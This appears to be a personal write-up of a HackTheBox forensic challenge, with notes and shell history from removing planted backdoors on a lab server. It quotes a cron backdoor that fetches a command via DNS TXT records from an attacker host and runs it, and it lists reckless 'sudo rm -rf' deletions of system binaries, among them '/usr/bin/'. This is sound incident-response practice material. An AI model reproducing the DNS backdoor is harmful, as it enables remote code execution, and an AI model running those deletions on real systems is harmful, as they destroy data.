@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>PersistenceIsFutile(Forensic challenge) · the-grizzly-bear</title>
+<meta name="description" content="PersistenceIsFutile(Forensic challenge) — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-challenges/persistenceisfutile-forensic-challenge.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Challenges</a></div>
+<h1 id="title">PersistenceIsFutile(Forensic challenge)</h1>
+
+<p>Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.</p>
+<p>username: user<br>
+password: hackthebox</p>
+<p><a href="https://0xv1n.github.io/posts/persistenceisfutile/" target="_blank" rel="noopener">https://0xv1n.github.io/posts/persistenceisfutile/</a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled.png"><img src="persistenceisfutile-forensic-challenge/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-1.png"><img src="persistenceisfutile-forensic-challenge/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-2.png"><img src="persistenceisfutile-forensic-challenge/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-3.png"><img src="persistenceisfutile-forensic-challenge/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-4.png"><img src="persistenceisfutile-forensic-challenge/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-5.png"><img src="persistenceisfutile-forensic-challenge/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-6.png"><img src="persistenceisfutile-forensic-challenge/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p>ps auxf</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-7.png"><img src="persistenceisfutile-forensic-challenge/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p>/var/lib/private/connectivity-check</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-8.png"><img src="persistenceisfutile-forensic-challenge/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>part 7 now partially fixed</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-9.png"><img src="persistenceisfutile-forensic-challenge/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-10.png"><img src="persistenceisfutile-forensic-challenge/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p>not sure whats going on</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-11.png"><img src="persistenceisfutile-forensic-challenge/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p>ok</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-12.png"><img src="persistenceisfutile-forensic-challenge/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p>removed</p>
+<p>user@forensicspersistence-17295-6647595f69-zjcqs:~$ sudo rm -rf /var/lib/private/connectivity-check<br>
+user@forensicspersistence-17295-6647595f69-zjcqs:~$ sudo rm -rf /etc/update-motd.d/30-connectivity-check</p>
+<p>removed and killed process</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-13.png"><img src="persistenceisfutile-forensic-challenge/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-14.png"><img src="persistenceisfutile-forensic-challenge/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p>user@forensicspersistence-17295-6647595f69-t4qcw:~$ crontab -l</p>
+<ul><li>/bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"</li></ul>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-15.png"><img src="persistenceisfutile-forensic-challenge/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p>no sudo cron</p>
+<p>removed crontab -e job</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-16.png"><img src="persistenceisfutile-forensic-challenge/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-17.png"><img src="persistenceisfutile-forensic-challenge/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p>removed access-up</p>
+<p>sudo rm -rf /etc/cron.daily/access-up</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-18.png"><img src="persistenceisfutile-forensic-challenge/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-19.png"><img src="persistenceisfutile-forensic-challenge/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-20.png"><img src="persistenceisfutile-forensic-challenge/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p>echo key to keys to rsa in</p>
+<p><code>bad /home/user/.bashrc</code></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-21.png"><img src="persistenceisfutile-forensic-challenge/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-22.png"><img src="persistenceisfutile-forensic-challenge/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-23.png"><img src="persistenceisfutile-forensic-challenge/untitled-23.png" alt="Untitled" loading="lazy"></a></p>
+<p>sudo rm -rf /lib/python3/dist-packages/ssh_import_id_updateF</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-24.png"><img src="persistenceisfutile-forensic-challenge/untitled-24.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-25.png"><img src="persistenceisfutile-forensic-challenge/untitled-25.png" alt="Untitled" loading="lazy"></a></p>
+<p>find / -user root -perm -4000 -print</p>
+<p>Find any binaries that are owned by root and also have SetUID permissions</p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-26.png"><img src="persistenceisfutile-forensic-challenge/untitled-26.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="persistenceisfutile-forensic-challenge/untitled-27.png"><img src="persistenceisfutile-forensic-challenge/untitled-27.png" alt="Untitled" loading="lazy"></a></p>
+<p>more clean up</p>
+<p>sudo rm -rf /usr/bin/alertd</p>
+<p>user@forensicspersistence-17295-6647595f69-zjcqs:~$ sudo rm -rf /etc/cron.daily/pyssh</p>
+<p>user@forensicspersistence-17295-6647595f69-zjcqs:~$ sudo rm -rf /root/.ssh/authorized_keys</p>
+<p>user@forensicspersistence-17295-6647595f69-zjcqs:~$ rm -rf /home/user/.backdoor<br>
+user@forensicspersistence-17295-6647595f69-zjcqs:~$ rm -rf /home/user/.sudo_as_admin_successful</p>
+<p>user@forensicspersistence-17295-6647595f69-zjcqs:~$ find / -user root -perm -4000 -print</p>
+<p>8  sudo rm -rf /usr/bin/alertd<br>
+9  sudo rm -rf /etc/cron.daily/access-up<br>
+10  sudo rm -rf /etc/cron.daily/pyssh<br>
+11  sudo rm -rf /lib/python3/dist-packages/ssh_import_id_update<br>
+12  sudo rm -rf /home/user/.backdoor<br>
+13  sudo rm -rf /usr/sbin/ppppd<br>
+14  sudo rm -rf /usr/sbin/afdluk<br>
+15  find / -user root -perm -4000 -print<br>
+16  sudo rm -rf /usr/bin/umount<br>
+17  sudo rm -rf /usr/bin/newgrp<br>
+18  sudo rm -rf /usr/bin/chsh<br>
+19  sudo rm -rf /usr/bin/chfn<br>
+20  sudo rm -rf /usr/bin/mount<br>
+21  sudo rm -rf /usr/bin/gpasswd<br>
+22  sudo rm -rf /usr/bin/dlxcrw<br>
+23  sudo rm -rf /usr/bin/<br>
+24  find / -user root -perm -4000 -print<br>
+25  ps auxf | grep connectivity-check | awk '{print $2}'<br>
+26  sudo kill 93<br>
+27  sudo kill 19<br>
+28  sudo kill 74<br>
+29  sudo ps axuf | grep "alertd" | awk '{print $2}'<br>
+30  sudo kill 102<br>
+31  sudo ps axuf | grep "alertd" | awk '{print $2}'<br>
+32  sudo kill 108<br>
+33  sudo ps axuf | grep "alertd"<br>
+34  sudo kill 114<br>
+35  sudo killall -9 alertd<br>
+36  sudo kill -9 alertd<br>
+37  sudo sed '$d' /root/.ssh/authorized_keys &gt; ~/a; sudo cp ~/a /root/.ssh/authorized_keys<br>
+38  sudo /root/solveme<br>
+39  euit<br>
+40  exit</p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
